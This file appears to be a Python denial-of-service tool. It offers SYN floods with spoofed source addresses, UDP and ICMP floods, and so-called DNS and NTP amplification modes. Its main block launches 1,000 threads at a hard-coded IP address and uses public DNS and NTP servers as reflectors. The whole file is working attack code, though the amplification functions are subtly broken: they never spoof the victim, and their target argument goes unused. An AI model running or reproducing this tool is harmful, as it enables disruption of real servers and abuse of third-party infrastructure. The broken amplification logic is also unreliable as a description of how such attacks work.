import socket
import threading
import time
import random
import struct

def syn_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            source_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            packet = build_syn_packet(source_ip, target_ip, target_port)
            sock.sendto(packet, (target_ip, target_port))
            print(f"Sent SYN packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error: {e}")

def build_syn_packet(source_ip, dest_ip, dest_port):
    ip_header = struct.pack("!BBHHHBBH4s4s",
        69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,
        socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
    tcp_header = struct.pack("!HHLLBBHHH",
        random.randint(1025, 65535), dest_port, 0, 0, 5 << 4, 2, 8192, 0, 0)
    return ip_header + tcp_header

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = b'A' * 65500
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
            print(f"Sent UDP packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending UDP packet: {e}")
            break

def dns_amplification(target_ip, dns_server, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    request = b'\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
    while time.time() < timeout:
        try:
            client.sendto(request, (dns_server, 53))
            print(f"Sent DNS amplification request to {dns_server}")
        except Exception as e:
            print(f"Error: {e}")

def ntp_amplification(target_ip, ntp_server, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    request = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while time.time() < timeout:
        try:
            client.sendto(request, (ntp_server, 123))
            print(f"Sent NTP amplification request to {ntp_server}")
        except Exception as e:
            print(f"Error: {e}")

def icmp_flood(target_ip, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = b'\x08\x00\xf7\xff' + b'\x00' * 1024
    while time.time() < timeout:
        try:
            sock.sendto(packet, (target_ip, 1))
            print(f"Sent ICMP packet to {target_ip}")
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    target_ip = "207.180.237.27"  # Replace with the target IP address
    target_port = 80  # Replace with the target port
    dns_server = "8.8.8.8"  # Replace with the DNS server IP
    ntp_server = "pool.ntp.org"  # Replace with the NTP server IP
    duration = 10  # Duration in seconds
    thread_count = 1000  # Adjust this based on your testing needs
    protocol = "udp"  # Change this to "syn", "udp", "dns", "ntp", "icmp" as needed
    threads = []

    try:
        for _ in range(thread_count):
            if protocol.lower() == "syn":
                thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
            elif protocol.lower() == "udp":
                thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
            elif protocol.lower() == "dns":
                thread = threading.Thread(target=dns_amplification, args=(target_ip, dns_server, duration))
            elif protocol.lower() == "ntp":
                thread = threading.Thread(target=ntp_amplification, args=(target_ip, ntp_server, duration))
            elif protocol.lower() == "icmp":
                thread = threading.Thread(target=icmp_flood, args=(target_ip, duration))
            else:
                print("Unknown protocol specified.")
                break
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print("\nAttack interrupted by user. Exiting...")

    print("Attack finished.")
